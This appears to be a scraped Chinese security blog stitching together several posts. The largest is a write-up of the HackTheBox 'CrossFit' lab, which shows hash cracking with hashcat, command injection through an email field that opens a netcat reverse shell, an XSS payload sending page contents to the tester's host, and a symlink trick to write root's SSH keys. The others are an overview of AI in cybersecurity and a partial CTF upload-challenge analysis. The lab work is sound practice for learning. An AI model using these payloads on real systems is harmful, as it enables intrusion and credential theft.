1/var/www/ftp/database/factories/UserFactory.php:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi 帐号是 hank 1/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/ 谷歌一下前面的 $2y 和 $6 特征，发现维基上有总结[7] Scheme id Schema Example DES Kyq4bCxAXJkbg _ BSDi _EQ0.jzhSVeUyoSqLupI 1 MD5 $1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81 2, 2a, 2x, 2y bcrypt $2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi 3 NTHASH $3$$8846f7eaee8fb117ad06bdd830b7586c 5 SHA-256 $5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD 6 SHA-512 $6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0 md5 Solaris MD5 $md5,rounds=5000$GUBv0xjJ$$mSwgIswdjlTY0YxV7HBVm0 sha1 PBKDF1 with SHA-1 $sha1$40000$jtNX3nZ2$hBNaIXkt4wBI2o5rsi8KejSjNqIq y yescrypt $y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7 对应两个哈希方式分别为 bcrypt 和 SHA-512 按之前玩国外CTF和靶机的经验，国外弱口令破解一般用 rockyou.txt ( kali 自动 sudo find / | grep rockyou.txt) 在 hashcat 上找对应哈希算法的值 12345678910hashcat --example-hashes | grep -i -A 1 -B 1 bcrypt# 输出# MODE: 3200# TYPE: bcrypt $2*$, Blowfish (Unix)# HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ouhashcat --example-hashes | grep -i -A 1 -B 1 sha512# 从输出中找到# MODE: 1800# TYPE: sha512crypt $6$, SHA512 (Unix)# HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1 先试试 bcrypt 看着没那么费时间，没解出来 1hashcat -m 3200 crossfit_bcrypt ~/Sec/Web/selffuzz/rockyou.txt -r /usr/local/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force -m 哈希类型，通过 –example-hashes 查到的 crossfit_bcrypt 为文件，内容为我们要破解的哈希 $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi -r 规则，即对原有字典的一些替换、移位和变异等[8]，kali 上文件在 /usr/share/hashcat/rules/best64.rule –force 忽略警告 SHA-512 破解得密码：powerpuffgirls 1hashcat -m 1800 crossfit_sha512 ~/Sec/Web/selffuzz/rockyou.txt -r /usr/local/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force ssh 登录 1ssh hank@10.10.10.208 权限提升 - 获取同组用户权限 （可选）命令执行利用 /home/hank/有个 user.txt 不知道是啥来的，扔 cmd5 查不到 发现可查看 isaac 用户的文件，里面有 send_updates/send_updates.php，刚好与 linpeas 发现的计划任务（/etc/crontab）对应，会每隔一分钟执行一遍，不过同组不可编辑，require进来的 includes/ 目录不可查看。该文件使用了一个外部依赖 use mikehaertl\\shellcommand\\Command;，发现一个外部可控的参数，$command-&gt;addArg($row[&#39;email&#39;], $escape=true); 不过好像进行转义了 说起邮件，突然想起这个页面 http://gym-club.crossfit.htb/jointheclub.php ，难道说，就是提取的这个邮箱发送东西的？ 原来 send_updates 也是用 Laravel 写的，查看 composer.json，发现 &quot;mikehaertl/php-shellcommand&quot;: &quot;1.6.0&quot; 版本为 1.6.0。 先查查这个组件这个版本有没有nday，谷歌一下 mikehaertl/php-shellcommand 1.6.0，果然有[9]， issue44 给出了两种利用方式，我们这是邮箱可控（$key），没有传入 value 值，并通过 addArg 指定了 $escape=true，好像，，，利用不了？见遇到的问题3 ，也就是 $escape 当作 $value 传入，导致 $key 没有被转移，进而导致命令注入 整理下思路：先看看 $row[&#39;email&#39;] 可不可控，如果可控则可通过 isaac 身份执行的计划任务执行命令 尝试了一下，看了源码，filter_var($email, FILTER_VALIDATE_EMAIL) 可以进行绕过，不过好像插入了没反应，突然想到应该确认是不是真的写进去了，db.php 发现数据库密码，直接连上去 1mysql -ucrossfit -p&quot;oeLoo~y2baeni&quot; 确实写进入了，而且为了也试了手动插入数据 1insert into users (email) values (&quot;123@qq.com||touch /tmp/pwn&quot;); 没有成功执行命令 仔细看了一下源码发现还有个文件遍历，要有文件才能执行下面的逻辑，但是这个 $msg_dir 未知，然后 includes/ 目录又没权限，晕… 12345678910111213141516171819202122232425262728293031323334353637&lt;?php/*************************************************** * Send email updates to users in the mailing list * ***************************************************/require(&quot;vendor/autoload.php&quot;);require(&quot;includes/functions.php&quot;);require(&quot;includes/db.php&quot;);require(&quot;includes/config.php&quot;);use mikehaertl\\shellcommand\\Command;if($conn)&#123; $fs_iterator = new FilesystemIterator($msg_dir); foreach ($fs_iterator as $file_info) &#123; if($file_info-&gt;isFile()) &#123; $full_path = $file_info-&gt;getPathname(); $res = $conn-&gt;query(&#x27;SELECT email FROM users&#x27;); while($row = $res-&gt;fetch_array(MYSQLI_ASSOC)) &#123; $command = new Command(&#x27;/usr/bin/mail&#x27;); $command-&gt;addArg(&#x27;-s&#x27;, &#x27;CrossFit Club Newsletter&#x27;, $escape=true); $command-&gt;addArg($row[&#x27;email&#x27;], $escape=true); $msg = file_get_contents($full_path); $command-&gt;setStdIn(&#x27;test&#x27;); $command-&gt;execute(); &#125; &#125; unlink($full_path); &#125;&#125;cleanup();?&gt; 寻找高权限FTP用户文件路径，或许应该从文件服务入手，如果系统里有更高权限的ftp用户，或许就可以读 includes/ 目录的文件或写入文件至 $msg_dir ，然后使命令执行条件满足？ 发现 ftp 也是 laravel，发现 .env 文件 123cat /var/www/ftp/.env# DB_USERNAME=ftphosting# DB_PASSWORD=&#125;2WZk.X;u&#123;L&gt;V 连一下数据库 1mysql -uftphosting -p&quot;&#125;2WZk.X;u&#123;L&gt;V&quot; 看了一下 accounts 表开始反思，xss+csrf 利用的ftp 是个web页面，数据是插入数据库的，那我是怎么通过 vsftp 连上去的咧 ？ 看一下 ftp 相关用户 12345cat /etc/passwd# ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin# vsftpd:x:1002:1002::/var/vsftpd:/bin/false# ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin 看一下配置文件，提取一下主要的 12345find /etc/ | grep ftp# /etc/ftpusers# /etc/vsftpd/user_conf/ftpadm# /etc/pam.d/vsftpd# /etc/vsftpd.conf 仔细对比了一下，这个 ftpadm 用户是一个真正的系统用户，和我们一开始通过 xss+ccsrf 创建的 ftp 用户有些许不一样（存在数据库里的） 看下配置文件 /etc/vsftpd.conf 123local_enable=YESpam_service_name=vsftpduser_config_dir=/etc/vsftpd/user_conf 参考vsftpd官方文档10 local_enable 表示可用 /etc/passwd 里的用户进行登录 pam_service_name 使用 pam进行认证，对应的文件在 /etc/pam.d/vsftpd user_config_dir 详细配置特定用户 看下 pam 目录文件，奇奇怪怪的姿势增加了 1cat /etc/pam.d/vsftpd 原来还可以通过 pam_mysql.so + MariaDB（MySQL） 认证 FTP 12345678910111213auth sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3account sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3# Standard behaviour for ftpd(8).auth required pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.# Standard pam includes@include common-account@include common-session@include common-authauth required pam_shells.so 其中配置里的 sufficient 表示当该模块匹配成功后，不会继续匹配其他模块，如果匹配失败了会匹配其他模块。 也就是说这个 ftpadm 用户是用于连接MariaDB，然后读取其中的 ftphosting.accounts 表的 username 和 pass 字段，来判断我们通过 21 端口登录的用户密码是否正确。如果数据库认证失败了，会通过pam_unix.so 认证系统用户 然后最后一行 auth required pam_shells.so[11]，就很关键了，即表示 /etc/shells记录可登入的shell类型，比如常见的有 /bin/zsh /bin/sh /bin/bash，看看 cat /etc/shells 12345678/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/bin/dash/usr/bin/dash/usr/sbin/nologin 震惊，竟然 /usr/sbin/nologin 也是可登录的，然后 ftpadm 用户也刚好是 /usr/sbin/nologin ，数据库的帐号密码刚好知道，user=ftpadm passwd=8W)&#125;gpRJvAmnb，会不会这个用户的密码就是这个咧？ 尝试一下 ftpadm/8W)&#125;gpRJvAmnb 12345lftpset ftp:ssl-force trueset ssl:verify-certificate noconnect 10.10.10.208login tari tari 登录进去了！ 瞎猜一下，这个会不会就是 $msg_dir 的目录呢？ 先上传个文件上去 然后邮箱构造为 1email=`touch$&#123;IFS&#125;/tmp/pwn`@qq.com 命令执行成功 反弹个shell 1email=`nc$&#123;IFS&#125;10.10.14.39$&#123;IFS&#125;2233$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash`@qq.com 顺便确认一下 $msg_dir 12345isaac@crossfit:~/send_updates$ cat includes/config.phpcat includes/config.php&lt;?php$msg_dir = &quot;/srv/ftp/messages&quot;;?&gt; 权限提升 - 获取root权限传个 pspy64 12chmod +x pspy64./pspy64 -f 发现一个 dbmsg 在定期运行，反编译，发现如下代码逻辑 123456789101112131415161718void main(void)&#123; __uid_t _Var1; time_t tVar2; _Var1 = geteuid(); if (_Var1 != 0) &#123; fwrite(&quot;This program must be run as root.\\n&quot;,1,0x22,stderr); /* WARNING: Subroutine does not return */ exit(1); &#125; tVar2 = time((time_t *)0x0); srand((uint)tVar2); process_data(); /* WARNING: Subroutine does not return */ exit(0);&#125; 首先发现一个伪随机，然后数据库读操作，且数据库读取 message 表里的内容，然后把前三个字段写入 /var/local/md(时间戳) 路径 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394void process_data(void)&#123; int iVar1; uint uVar2; long lVar3; undefined8 uVar4; size_t sVar5; undefined local_f8 [48]; char local_c8 [48]; char local_98 [48]; undefined local_68 [28]; undefined4 local_4c; long local_48; FILE *local_40; long *local_38; long local_30; long local_28; long local_20; local_20 = mysql_init(0); if (local_20 == 0) &#123; fwrite(&quot;mysql_init() failed\\n&quot;,1,0x14,stderr); /* WARNING: Subroutine does not return */ exit(1); &#125; lVar3 = mysql_real_connect(local_20,&quot;localhost&quot;,&quot;crossfit&quot;,&quot;oeLoo~y2baeni&quot;,&quot;crossfit&quot;,0,0,0); if (lVar3 == 0) &#123; exit_with_error(local_20); &#125; iVar1 = mysql_query(local_20,&quot;SELECT * FROM messages&quot;); if (iVar1 != 0) &#123; exit_with_error(local_20); &#125; local_28 = mysql_store_result(local_20); if (local_28 == 0) &#123; exit_with_error(local_20); &#125; local_30 = zip_open(&quot;/var/backups/mariadb/comments.zip&quot;,1,&amp;local_4c); if (local_30 != 0) &#123; while (local_38 = (long *)mysql_fetch_row(local_28), local_38 != (long *)0x0) &#123; if ((((*local_38 != 0) &amp;&amp; (local_38[1] != 0)) &amp;&amp; (local_38[2] != 0)) &amp;&amp; (local_38[3] != 0)) &#123; lVar3 = *local_38; uVar2 = rand(); snprintf(local_c8,0x30,&quot;%d%s&quot;,(ulong)uVar2,lVar3); sVar5 = strlen(local_c8); md5sum(local_c8,sVar5 &amp; 0xffffffff,local_f8); snprintf(local_98,0x30,&quot;%s%s&quot;,&quot;/var/local/&quot;,local_f8); local_40 = fopen(local_98,&quot;w&quot;); if (local_40 != (FILE *)0x0) &#123; fputs((char *)local_38[1],local_40); fputc(0x20,local_40); fputs((char *)local_38[3],local_40); fputc(0x20,local_40); fputs((char *)local_38[2],local_40); fclose(local_40); if (local_30 != 0) &#123; printf(&quot;Adding file %s\\n&quot;,local_98); local_48 = zip_source_file(local_30,local_98,0); if (local_48 == 0) &#123; uVar4 = zip_strerror(local_30); fprintf(stderr,&quot;%s\\n&quot;,uVar4); &#125; else &#123; lVar3 = zip_file_add(local_30,local_f8,local_48); if (lVar3 &lt; 0) &#123; zip_source_free(local_48); uVar4 = zip_strerror(local_30); fprintf(stderr,&quot;%s\\n&quot;,uVar4); &#125; else &#123; uVar4 = zip_strerror(local_30); fprintf(stderr,&quot;%s\\n&quot;,uVar4); &#125; &#125; &#125; &#125; &#125; &#125; mysql_free_result(local_28); delete_rows(local_20); mysql_close(local_20); if (local_30 != 0) &#123; zip_close(local_30); &#125; delete_files(); return; &#125; zip_error_init_with_code(local_68,local_4c); uVar4 = zip_error_strerror(local_68); fprintf(stderr,&quot;%s\\n&quot;,uVar4); /* WARNING: Subroutine does not return */ exit(-1);&#125; 因为随机数为伪随机，用的标准库函数，我们如果也用C，在目标机器上执行，跟着一起执行，在相同时间生成的就是一样的。 这里写入的文件内容刚好为3个字段，我们可控，因 dbmsg 是root运行，我们可以写ssh认证公钥进去。因软连接是没有权限限制，只要我们执行了，他就会链接，那么我们可控的内容就可以写入免认证文件里了。 1ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./exploit)1 | md5sum | cut -d &quot; &quot; -f 1) 遇到的问题1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开构造以下payload请求链接 http://ftp.crossfit.htb/accounts/create，保存以下payload为payload2.js（下面 IP 变为 10.10.14.4 是因为openvpn断了，所以我本机IP变了） 12345678910var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState === 4 &amp;&amp; this.status === 200) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;POST&quot;, &quot;http://10.10.14.4:2233/&quot;, false); xhr2.send(this.responseText); &#125;&#125;;xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb/accounts/create&quot;, false);xhr.send(); 像之前一样请求，不知为啥，这里卡了好久，服务端可以来我这获取 js代码，但是，nc就是接收不了，或者说是，nc接收到立刻退出，啥都没显示 然后通过 tcpdump 抓包，发现能正常显示…. 1tcpdump -i utun2 host 10.10.14.4 and port 2233 -X 麻了…. 会不会是特殊字符影响了 nc 呢？payload2.js 改改 12345678910var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (this.readyState === 4 &amp;&amp; this.status === 200) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(&quot;GET&quot;, &quot;http://10.10.14.4:2233/&quot; + btoa(this.responseText), true); xhr2.send(); &#125;&#125;;xhr.open(&quot;GET&quot;, &quot;http://ftp.crossfit.htb/accounts/create&quot;, false);xhr.send(); 啊这… 不应该呀，那前面的 POST 怎么收到的？（虽然前面也会偶尔退出，但还是能收到的） 等等GET和POST… 难不成当POST请求体过大时，HTTP协议会变成分块传输？ 然后 nc 识别分块有误，所以就退出了？ 尝试了一下持续监听，除非用^C或 ^D强制退出 1nc -lvk 0.0.0.0 2233 无果，还是没回显，有大佬知道解决方式的麻烦告知一下~ 2、xhr同会话问题设置 withCredentials = true 可以保证两个xhr请求他们在同一会话中，不是很清楚为啥… 根据浏览器的保护规则，跨域的时候我们创建的sessionId是不会被浏览器保存下来，也就是说，每一次的请求，服务器就会以为是一个新的人，而不是同一个人，当我们指定 withCredentials = true ，服务端会判断请求源是否在已配置的白名单中，如有，则返回 Access-Control-Allow-Origin ，浏览器看到服务端返回的源在可信范围内，则会保存sessionId，所以就保证了多个xhr请求在同一会话中。 3、PHP指定形数，传入的不是指定的形参Command.php 代码：https://github.com/mikehaertl/php-shellcommand/releases/tag/1.6.0 看了半天看不出来，传入一个 $key 和 $escape 应该有转义才对，把库拉下来，本机 debug 一下就破案了… 指定了$escape=true 这个参数，，但是传入的实际还是 $value ? 这么迷的，也就是说就算 $escape=true ，$escape 还是没有被传入… 然后 $value 传入了，导致 $key 没有被转移 PHP5.6 和 PHP7.3都试过了，一样…. 4、好像没设置httponly 但为啥抓不到cookieGetShell后发现，本来就没有Cookie，只是管理员直接通过 127.0.0.1 去访问，我们外部没法直接访问 总结好像环境经常有毛病？比如lftp不知为啥连不上，有时候数据接收不会来，，之类的 的 参考链接[1] https://www.sqlsec.com/2017/07/nmap.html [2] https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294 [3] https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies [4] https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF [5] https://wfuzz.readthedocs.io/en/latest/user/advanced.html#filter-language [6] https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open [7] https://en.wikipedia.org/wiki/Crypt_(C) [8] https://hashcat.net/wiki/doku.php?id=rule_based_attack [9] https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426 [10] https://security.appspot.com/vsftpd/vsftpd_conf.html [11] https://linux.die.net/man/8/pam_shells [12] https://www.hackthebox.eu/home/machines/writeup/277 https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html https://0xdedinfosec.github.io/posts/htb-crossfit/","categories":[{"name":"HTB","slug":"HTB","permalink":"https://tari.moe/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://tari.moe/tags/HTB/"}]},{"title":"人工智能在网络安全领域的技术和应用","slug":"2021/ai-in-cybersec","date":"2021-08-07T15:17:37.000Z","updated":"2022-02-01T04:23:39.639Z","comments":true,"path":"/p/2021/ai-in-cybersec/","link":"","permalink":"https://tari.moe/p/2021/ai-in-cybersec/","excerpt":"","text":"前言事情起因：老师让我帮忙找一些人工智能在网络安全领域涉及到的技术和应用，刚好来个我接触过的小总结~ 然后在前沿网络安全领域的应用（3-5），主要是一个在读研同学提供的，他们的实验室主要是搞AI安全，感谢~ 一、用到的人工智能相关技术用到的人工智能技术太多了，这里适当列举一些学习过的~ 生成对抗网络 KNN 朴素贝叶斯 多层感知机 循环神经网络 卷积神经网络 LSTM TF-IDF 词向量Word2vec 词袋模型BOW 语义分析 二、人工智能在传统网络安全领域的应用1、图形验证码识别【应用背景简述】 攻击者在进行需要登录操作的Web攻击时，会使用脚本或工具结合字典对用户弱口令（许多用户为了便捷易记，通常使用 123456、password等小于8位且没有组合大小写数字特殊字符密码）进行爆破。此外，通常许多管理员只使用了 admin/admin 等弱口令组合，使得攻击者可以轻易进入网站后台获取大量数据，危害性极大。 网站为了用户的安全性，增加了图形验证码操作，这些验证码通常是增加了字符重叠变形模糊等噪声，传统的OCR技术不能直接提取（如图1-1所示），所以攻击者无法直接通过脚本或工具获得图形验证码的文本信息，从而防止攻击者恶意爆破弱口令。 图1-1 经过添加噪声的图形验证码 其实这本质上是一个从图形中提取文本信息问题，通过卷积、残差等神经网络在图像识别中都能取得了不错的效果，像图1-1中的验证码一般经过一定数据量的训练可以达到99%的准确率。 【相关开源项目 - 具体原理和过程可以看项目README】 1、基于 CNN/ResNet/DenseNet+GRU/LSTM+CTC/CrossEntropy 的图形验证码识别 https://github.com/kerlomz/captcha_trainer 2、基于Keras 和深度卷积神经网络的图形验证码识别 https://github.com/ypwhs/captcha_break 【相关论文】 [1]田勇.基于机器学习的字符图像验证码识别研究[J].集宁师范学院学报,2021,43(02):87-90. [2]汤战勇,田超雄,叶贵鑫,李婧,王薇,龚晓庆,陈晓江,房鼎益.一种基于条件生成式对抗网络的文本类验证码识别方法[J].计算机学报,2020,43(08):1572-1588. 2、源代码安全审计【应用背景简述】 代码审计是通过自动化分析工具和人工审查的组合审计方式，通过对源代码进行逐条分析，发现程序错误、安全漏洞和违反程序规范，最后提供代码修订措施和建议。如图2-1 kafka项目业务涉及到 OS 的 CLI 交互时，通常会拼接用户传入的参数，如果参数可控没有进行合理过滤会导致命令注入漏洞， 攻击者就可以通过拼接的方式注入攻击者想要执行的命令，从而控制目标计算机。但下图中，其实os.system 和 safe.system 都是存在命令注入的，传统的re匹配非常容易产生漏报和误报（当然还有很多单由规则匹配导致的误报漏报的场景）。实际场景中这些函数逻辑是十分复杂，代码量十分庞大的，单靠人工审计局限性也很明显。 因此一般结合一些NLP相关的，如词向量和语义分析等，来结合程序上下文语义来提高检测的精确率和召回率。 【相关开源项目】 暂无发现 【相关论文】 [1] A Review of Machine Learning in Software Vulnerability Research https://www.dst.defence.gov.au/sites/default/files/publications/documents/DST-Group-GD-0979.pdf [2] 赵伟. 一种PHP代码审计技术的研究与实现[D].西安电子科技大学,2020. [3] 陈璐璐. 基于机器学习的代码缺陷自动确认方法研究及实现[D].北京邮电大学,2020. 3、WebShell检测【应用背景简述】 Webshell是指以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，攻击者一般通过向服务器植入恶意代码以实现控制Web服务器的目的。 一般的webshell可通过判断敏感函数（涉及到代码执行，如eval、system等）来进行判断，网站上是否存在Webshell，如图3-1右边所示。但一般有经验的攻击者会把Webshell经过混淆，和其他网页文件一样使用正常变量，接收参数，使用正常的函数，但人工很容易能看出是Webshell，通过传统的关键字匹配就无法识别。 图3-1 经过混淆Webshell和正常Webshell 【相关开源项目】 1、提取PHP执行中的opcode，采用 opcode词袋 + tf-idf 进行关键信息提取，采用朴素贝叶斯算法进行训练。 https://github.com/hi-wenr0/mlcheckwebshell 补充：opcode 是汇编指令级代码，因为提取opcode更能还原恶意代码行为特征，而无需关心原有代码的混淆情况。但人直接看汇编代码，很难理解其上下文信息，很难判断一个文件是否为Webshell。 【相关论文】 [1] 周子恒,李琳,赵叙,李凯.基于深度学习的Webshell恶意代码检测方法研究[J].电脑知识与技术,2021,17(07):180-183. [2] 岳子涵,薛质,沈兴文,吴毅良.基于语义分析的PHP Webshell检测方法研究[J].通信技术,2020,53(12):3051-3055. 4、恶意样本检测【应用背景简述】 引用自： Huang, X., Ma, L., Yang, W. et al. A Method for Windows Malware Detection Based on Deep Learning. J Sign Process Syst 93, 265–273 (2021). https://doi.org/10.1007/s11265-020-01588-1 随着互联网在人们工作生活中的深入应用和快速发展，恶意软件的种类和数量与日俱增，给网络用户的信息安全、隐私安全等带来极大威胁。 最早的恶意软件检测技术是基于特征码匹配的检测，分析人员提取恶意软件中一或多段段具有标志性的代码序列作为“特征码”，加入到杀毒软件的特征库中，杀毒软件扫描时，将文件与特征库中的特征码一一匹配，若发现特征一致，则判定该文件为恶意。这种检测技术的好处是准确率较高、误报率较低，因为特征是由人工分析提取，所以不容易出现将正常文件错认为病毒的情况；但坏处是面对新出现的恶意软件力不从心，用户不受保护的空窗期较长，检测具有滞后性。 为弥补特征码的这种缺陷，又出现了基于启发式规则的检测和云检测。所谓启发式规则就是一些经验法则，将分析人员判定恶意文件的一些经验融入到杀毒软件中，例如一个文件加了一些不常见的“壳”，就可以认为这个文件比较可疑，这种检测技术可以应对部分新出现的恶意软件，但有可能产生较多误报。云检测则是将本地的病毒特征库移到了云端，从而消除了用户手动更新本地特征库的需要，使得空窗期大大缩短。 由于传统特征码匹配技术的滞后性和启发式扫描的高误报率，安全公司和研究人员把目光转向机器学习领域，希望借助机器学习检测恶意软件，实现一种既准确又及时的检测。 前人研究已将恶意文件可视化为图像，根据文件信息熵、字节频率值的相对大小将PE文件转化为RGB图，然后赋予危险的API调用赋予越醒目的颜色（恶意软件通常调用一些危险的API），再提取图像特征用传统机器学习算法进行分类。 5、自动渗透测试工具【应用背景简述】 现有的内网nday批量利用工具多为使用枚举式利用工具，通常在内网造成的动静较大，极易被EDR、态势感知等系统发现，这主要是因为Fofa、ZoomEye、云悉指纹等成熟的在线资产指纹探测工具无法在内网使用，从而无法得知目标主机的指纹信息。只能使用线下工具对目标进行指纹识别意味着指纹库较少，无法准确识别目标资产类型，使得只能针对每个nday进行枚举渗透。 强化学习技术通常可以用相对较少的数据训练出一个不错的拟合模型，在现有信息较少的情况下，如A2C、A3C算法，通过与环境的交互过程中通过学习策略以达成回报最大化，以实现更加精准的nday利用。 【相关开源项目】 1、利用Nmap进行信息收集（同时结合朴素贝叶斯算法识别传统指纹识别方法无法识别的一些特征）、MSF为nday利用框架、A3C强化学习算法实现更加精准的nday利用。 https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit 三、人工智能在前沿网络安全领域的应用1、人脸识别攻击【应用背景简述】 人脸识别作为生物指纹验证技术，现已在全国大范围普及开来，也作为公认作为一种安全、适应于支付场景的身份验证方式。人脸识别主要是通过深度学习模型通过提取人脸特征向量的方式进行，而生成对抗网络通过网络上应用到了的模型来生成一种肉眼不可见，但是对机器影响很大的噪声加载造恶这个模型的输入上面，这样的输入就可以导致模型给出错误的结果。如通过添加了恶意噪声来生成一个3D面具并3D打印从而骗过人脸识别算法，从而伪造他人身份。 【相关文章】 深度伪造(Deepfake)原理分析及实战 https://www.anquanke.com/post/id/249632 涉及的论文和开源项目 https://arxiv.org/pdf/2104.11280.pdf https://github.com/AliaksandrSiarohin/first-order-model 【相关开源项目】 1、通过AdvHat算法对人脸识别系统进行黑盒攻击 https://github.com/papermsucode/advhat 【相关论文】 [1] Yin, Bangjie, et al. “Adv-Makeup: A New Imperceptible and Transferable Attack on Face Recognition.” arXiv preprint arXiv:2105.03162 (2021). 2、态势感知态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。 态势感知虽然更多的利用的是大数据处理技术，因为其应用场景多为大企业内部安全、市级、省级甚至国家级安全层面对威胁风险的感知，数据量多为PB级及其以上。但如何从海量数据中自动分析潜在风险和应对未知威胁，也是个值得研究的问题，许多企业都把特征工程和神经网络技术应用与态势感知系统中，通过关联分析、联动响应和告警降噪等提高高级威胁与异常行为的精确度。 3、成员推理攻击近年来国家对用户隐私数据越发重视，数据泄漏事件也是层出不穷。深度学习模型通常需要大规模数据集进行训练。成员推理攻击根据一个模型的输出结果以及部分这个模型的参数来反推出包含隐私数据的数据成员，这样可以通过网络上已经应用到的网络模型来反推一些隐私数据。 4、模型窃取攻击模型窃取攻击就是，比如说网络上应用到一种人工智能模型，那么攻击者就可以通过一部分这个模型的可获得的参数以及一定量的输入来够推断出这个模型的大部分参数，从而重构一个窃取模型来达到盗取专利的效果。 5、数据投毒攻击人工智能模型的训练需要大量的数据，如果攻击者在训练数据里面做一些投毒处理，比如说把一个正确的标签，改成一个错误的标签，这个模型的训练结果就会出错。应用到网络安全方面，网络上可能一些模型需要用户这边传入数据，但是攻击者就会从用户传入的这些数据里面下毒，这样模型就会出现错误的情况。 参考链接见相关开源项目和相关论文部分~","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://tari.moe/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"https://tari.moe/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}]},{"title":"2021红帽杯线下赛WEB upload题解","slug":"2021/2021hmb-offline","date":"2021-07-30T15:42:37.000Z","updated":"2022-02-01T04:24:19.921Z","comments":true,"path":"/p/2021/2021hmb-offline/","link":"","permalink":"https://tari.moe/p/2021/2021hmb-offline/","excerpt":"","text":"虽然没参加，不过有个师傅跑过来讨论了，就顺便搞搞，第一题是opensns的nday，这里主要分析下第二题upload。还挺有意思，原来一开始想着用像 [CVE-2021-3129](https://tari.moe/2021/06/03/laravel8-debug-rce/ 的方式写入可控的 session文件，结果 h 被过滤了。。 upload源码 upload.7z 源码分析关键文件有两个：index.php 和 info.php info.php 主要是告诉我们，session存在 /tmp 目录下 index.php 内容较多，不过分析了一波，首先映入眼帘的是 file_put_contents 方法，参数没有进行过滤，存在目录穿越。那我们可以通过目录穿越写 session 文件了。 PHP的session默认是以文件的形式进行存储，而且文件名是以 sess_ 开头的，后面的值为，为我们Cookie中 PHPSESSID=xxxxxxxxxxxxx 的 xxxxxxxxxxxxx。也就是我们以 PHPSESSID=xxxxxxxxxxxx 访问站点，PHP会在 /var/lib/tmp/php 之类的目录创新一个名为 sess_xxxxxxxxxxxxx 的文件，内容为序列化后的数据。 但题目过滤了字符 h 123if(stristr($_POST[&#x27;filename&#x27;], &#x27;h&#x27;))&#123; die(&#x27;no h!&#x27;);&#125; 正常来说，我们是没法目录穿越至存放 session 的路径的，毕竟有 /php 有 h，但，题目中 session.save_path 在 /tmp 目录，而且写入的内容没有限制，也就是说我们可以任意伪造 session 了。 75行处看似可以调用函数 12$pathinfo = array($_GET[&#x27;file&#x27;]=&gt;$_SESSION[&#x27;files&#x27;][$_GET[&#x27;file&#x27;]]);$&#123;$_SESSION[&#x27;func&#x27;]&#125;($pathinfo); 仔细一分析… 这里 $&#123;&#125; 原来是一种简单语法，也就是先获取$_SESSION[&#39;func&#39;]的值，作为变量名，然后作为函数名去调用，当然可以构造 $_SESSION[&#39;func&#39;] 为 _SESSION[&quot;paths&quot;] 然后 $_SESSION[&quot;paths&quot;] 为 system 之类的，但 $pathinfo 是数组…. 暂时没发现啥方法是传入数组进行利用的。 所以另辟蹊径，发现56行 new 了一个对象 1$temp = new $class($path); 下面有个直接输出 1echo $out.&#x27;&lt;/p&gt;&#x27;; 因 echo 对象会触发对象的 __toString 魔术方法，如果能找到啥对象实例化后的 __toString 魔术方法，会对 $path 进行一些利用（如输出这个参数文件内容，执行这个参数命令之类的）就好了。 